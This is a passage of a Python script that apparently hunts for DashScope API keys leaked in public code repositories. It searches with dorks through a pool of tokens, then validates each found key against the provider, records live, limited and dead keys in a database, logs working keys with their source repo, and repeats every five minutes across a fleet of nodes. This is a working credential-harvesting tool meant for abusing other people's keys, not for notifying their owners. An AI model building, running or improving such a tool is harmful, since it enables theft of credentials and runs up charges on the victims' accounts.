                "WHERE hash=?", (real_prov, plan[:200], "OK", hsh))
        return ("WORKING", plan)
    classes = {r[1] for r in results}
    if classes & {"throttled", "net"}:
        # transient: leave the row NEW so the validator retries it later
        return ("NEW", "retry:" + ",".join(sorted(classes & {"throttled", "net"})))
    if "UNVERIFIED_AUTHBLIND" in classes:
        # Transient on purpose, not terminal. A cached public catalog is a CDN
        # edge condition that clears on its own, so the row is worth one more
        # look next run; and since plan keys now get a real verdict from the
        # tier-2 coding-plan probe, nothing spins forever. An earlier revision
        # parked these as LIMITED to bound retries - dropped because it also
        # parked live keys. The note must name the class: "retry:" alone (the
        # intersection above omits AUTHBLIND) hid the reason in every node log.
        # Demote rows a previous blind probe stamped WORKING: re-find +
        # authblind must never leave the fiction standing (the insert path
        # only demotes DEAD/ERR, so without this write a false WORKING row
        # survives forever). No-op for rows already NEW.
        with dblock:
            conn.execute(
                "UPDATE keys SET status='NEW', plan='authblind-requeue' "
                "WHERE hash=? AND status='WORKING'", (hsh,))
        return ("NEW", "retry:UNVERIFIED_AUTHBLIND")
    if classes & {"arrearage", "no_model", "free_tier"}:
        note = ",".join(sorted(classes & {"arrearage", "no_model", "free_tier"}))
        with dblock:
            conn.execute("UPDATE keys SET status='LIMITED', plan=? "
                         "WHERE hash=?", (note[:200], hsh))
        return ("LIMITED", note)
    with dblock:
        conn.execute("UPDATE keys SET status='DEAD' WHERE hash=?", (hsh,))
    return ("DEAD", None)


def main():
    log(f"=== dashscope hunt START pats={len(POOL.tokens)} "
        f"dorks={len(DORKS)} pages={PAGES} ===")
    if SHARD_FALLBACK:
        # MOD > len(DORKS) empties every slice: the hunt would print
        # "HUNT done: +0 keys", exit 0 and look healthy to systemd, zeroing the
        # whole fleet with no error anywhere. Say it in the banner instead.
        log(f"SHARD FALLBACK: KF_DORK_MOD={DORK_MOD} exceeds the dork list, "
            f"shard {DORK_SHARD} is empty -> hunting all {len(DORKS)} dorks")
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        futs = {ex.submit(work, q): q for q in DORKS}
        for fut in as_completed(futs):
            q = futs[fut]
            try:
                n = fut.result()
                if n:
                    log(f"  dork +{n}: {q!r}")
            except Exception as e:
                log(f"  dork error {q!r}: {e!r}")
    log(f"HUNT done: +{len(found_keys)} keys, "
        f"raw_files={raw_fetched[0]} — validating...")

    working = dead = 0
    with ThreadPoolExecutor(max_workers=N_THREADS) as ex:
        futs = {}
        for hsh, (key, prov, repo) in found_keys.items():
            futs[ex.submit(validate_key, hsh, key, prov, repo)] = (hsh, key,
                                                                   prov, repo)
        for fut in as_completed(futs):
            hsh, key, prov, repo = futs[fut]
            try:
                st, info = fut.result()
            except Exception:
                continue
            if st == "WORKING":
                working += 1
                log(f"  LIVE {key[:12]}... {info}  <- {repo[:70]}")
            elif st == "DEAD":
                dead += 1
    log(f"VALIDATE done: WORKING={working} DEAD={dead} "
        f"(of {len(found_keys)})")


LOOP_SLEEP = 300


def loop():
    while True:
        try:
            found_keys.clear()
            seen_files.clear()
            raw_fetched[0] = 0
            main()
        except Exception as e:
            log(f"loop error: {e!r}")
        log(f"sleep {LOOP_SLEEP}s before next cycle")
        time.sleep(LOOP_SLEEP)


if __name__ == "__main__":
    import sys
    if "--loop" in sys.argv:
        loop()
    else:
        main()
